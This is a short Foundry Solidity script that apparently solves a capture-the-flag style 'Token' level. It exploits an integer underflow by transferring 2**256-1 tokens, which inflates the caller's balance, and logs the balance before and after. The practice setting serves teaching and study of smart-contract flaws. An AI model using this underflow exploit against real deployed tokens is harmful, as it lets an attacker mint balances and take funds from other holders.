// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import {Script, console} from "forge-std/Script.sol";
import {Token} from "../src/levels/Token.sol";

contract TokenScript is Script {
    Token public token = Token(payable(0x2F1b7886C95716941057c6b3760982a2ED2534b5));

    function run() external {
        vm.startBroadcast();
        console.log("Player initial balance:", token.balanceOf(msg.sender));
        token.transfer(address(token), (2 ** 256) - 1);
        console.log("Player final balance:", token.balanceOf(msg.sender));
        vm.stopBroadcast();
    }
}
